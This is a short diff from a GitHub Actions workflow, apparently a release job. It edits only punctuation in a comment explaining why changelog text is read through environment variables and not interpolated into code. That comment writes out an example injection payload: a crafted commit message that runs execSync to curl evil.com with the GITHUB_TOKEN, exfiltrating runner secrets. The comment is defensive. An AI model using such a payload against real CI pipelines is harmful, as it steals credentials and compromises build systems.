@@ -210,7 +210,7 @@ jobs:
           # into this string from `git log` and an attacker could craft
           # `feat: x ${require('child_process').execSync('curl evil.com?t='+process.env.GITHUB_TOKEN)}`
           # which would execute on the runner with secrets exposed (TAURI_*, NEON_*, APPLE_*).
-          # Reading from process.env keeps the value as a plain string — JS template
+          # Reading from process.env keeps the value as a plain string, JS template
           # literal evaluation only happens against the literal text we author below.
           CHANGELOG: ${{ steps.changelog.outputs.changelog }}
           PREVIOUS_TAG: ${{ steps.changelog.outputs.previous_tag }}
